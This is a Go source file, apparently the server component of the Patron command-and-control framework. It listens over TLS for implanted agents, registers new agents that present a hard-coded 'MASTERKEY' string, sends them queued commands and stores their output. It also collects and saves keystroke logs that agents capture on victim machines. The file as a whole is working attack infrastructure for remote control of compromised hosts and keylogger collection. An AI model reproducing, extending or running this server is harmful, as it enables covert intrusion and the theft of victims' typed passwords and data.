package main

import (
	"bufio"
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/google/uuid"
)

//make it central
func IsValidUUID(u string) bool {
	_, err := uuid.Parse(u)
	return err == nil
}

func handleconn(connection net.Conn) {
	for {

		text, _ := bufio.NewReader(connection).ReadString('\n')
		message := strings.Split(text, "\n")
		// fmt.Println(message[0])
		if message[0] != "" {
			// slpit message
			glob := strings.Split(message[0], ":")
			// fmt.Println(glob)
			if len(glob) == 11 {
				uid := glob[0]
				user := glob[1]
				hostname := glob[2]
				ip := glob[3]
				keyOrNot := glob[5] // because of unfiltered hostname adding port
				AgentServerIP := glob[6]
				AgentServerPort := glob[7]
				AgentFreq := glob[8]
				AgentJitter := glob[9]
				masterkey := glob[10]
				if IsValidUUID(uid) {

					// search uuid in database using received uuid
					fetch, err := data.FetchOneAgent(uid)                  // first pass agent check
					if err != nil {
						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
					}
					if fetch.Uuid == "" && masterkey == "MASTERKEY" { //prob check its a uuid and master key                // future fix (accepts all uuid) reason: to allow server create agent record in db
						//parse IP, hostname and user from agent
						data.CreateAgent(uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
						data.CreateKeys( uid)
					}
					fetch, err = data.FetchOneAgent( uid) // second pass agent check
					if err != nil {
						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
					}
					logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
					if uid == fetch.Uuid {
						// Handle command response
						if keyOrNot == "NoKeysBeacon" {

							logger.Logf(logger.Info, "Agent %s Connected\n", uid)
							encoder := gob.NewEncoder(connection)
							instruct := data.FetchNextCommand( fetch.Uuid)
							logger.Logf(logger.Info, "Fetched %s \n", instruct.CommandType)
							if err := encoder.Encode(instruct); err != nil {
								log.Fatalln(err)
							}
							destruct := &types.GiveServerResult{}
							dec := gob.NewDecoder(connection)
							dec.Decode(destruct)

							if destruct.Result == "2" {
								logger.Logf(logger.Debug, "Agent %s Sent Nothing Back\n", uid)
								connection.Close()
							} else {
								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
								data.UpdateAgentCommand( destruct.CommandUUID, destruct.Output, fetch.Uuid)
								if destruct.Output == "~Killed~" {
									logger.Logf(logger.Warning, "Agent %s Killed\n", uid)
									connection.Close()
								}
								connection.Close()
							}
							now := time.Now()
							data.UpdateAgentCheckIn( uid, now.Unix())
						} else if keyOrNot == "KeysBeacon" { // Handle keylog response

							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
							encoder := gob.NewEncoder(connection)
							instruct := &types.KeySend{Uuid: uid}
							logger.Logf(logger.Info, "Key Send %s \n", instruct.Uuid)
							if err := encoder.Encode(instruct); err != nil {
								log.Fatalln(err)
							}
							destruct := &types.KeyReceive{}
							dec := gob.NewDecoder(connection)
							dec.Decode(destruct)

							if destruct.Keys != "" {
								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
								data.UpdateAgentKeys( uid, destruct.Keys)
								connection.Close()
							} else {
								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
								connection.Close()
							}
							now := time.Now()
							data.UpdateAgentCheckIn( uid, now.Unix())
						} else {
							logger.Logf(logger.Info, "Unknown Beacon Type\n")
							connection.Close()
						}
					} else {
						// agent not in database!!!
						logger.Logf(logger.Info, "Unknown Agent, Wrong Key\n")
						connection.Close()
					}
				} else {
					logger.Logf(logger.Info, "Invalid UUID\n")
					connection.Close()
				}
			} else {
				logger.Logf(logger.Info, "Wrong blob count\n")
				connection.Close()
			}
		}
	}

}

func main() {
	// Enable or disable logging based on a condition
	enableLogging := true
	logger.EnableLogging(enableLogging)

	// Set the log file
	logFileName := "logs/server.log"
	err := logger.SetLogFile(logFileName)
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
		return
	}

	c2serverip := os.Getenv("C2SERVER_IP")
	c2serverport := os.Getenv("C2SERVER_PORT")

	data.OpenDatabase()
	data.InitDatabase()

	cer, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
	if err != nil {
		log.Fatal(err)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	listener, err := tls.Listen("tcp", c2serverip+":"+c2serverport, config)
	if err != nil {
		log.Fatalln(err)
	}
	// Update Agent status ricker
	ticker := time.Tick(300 * time.Second) //could possibly cause a deadlock

	defer listener.Close()
	for {
		select {
		case <-ticker:
			go data.UpdateAgentStatus()
		default:
			connection, err := listener.Accept()
			if err != nil {
				log.
					Fatalln(err)
			}
			go handleconn(connection)
		}

	}
}
